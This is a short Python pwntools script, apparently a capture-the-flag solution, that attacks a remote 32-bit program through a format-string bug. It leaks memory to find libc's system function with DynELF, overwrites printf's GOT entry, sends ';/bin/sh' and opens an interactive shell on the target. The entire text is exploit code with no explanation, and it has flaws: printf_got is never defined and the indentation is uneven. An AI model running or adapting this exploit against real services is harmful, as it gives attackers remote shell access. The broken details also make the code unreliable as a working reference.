from pwn import *

#io = process("")
io = remote("xxx",xxx)

def leak(addr):
    result = ''
    while(len(result)< 4):
       io.sendafter('Please tell me:', '%16$s#\n\0'.ljust(0x21, '\0') +p32(addr + len(result)) + '\0')
        io.recvuntil('Repeater:')
        result +=io.recvuntil('#\n', drop=True) + '\0'
   log.info(hex(addr) + ' => ' + hex(u32(result[:4])))
    return result[:4]

libc = DynELF(leak, 0x8048000)

system_addr = libc.lookup('system', 'libc')
log.success('system_addr: ' + hex(system_addr))

payload_cover = 'x' + fmtstr_payload(8,{printf_got : system_addr},numbwritten=10)
io.sendline(payload_cover)
io.recv()

io.sendline(";/bin/sh\0")
 
io.interactive()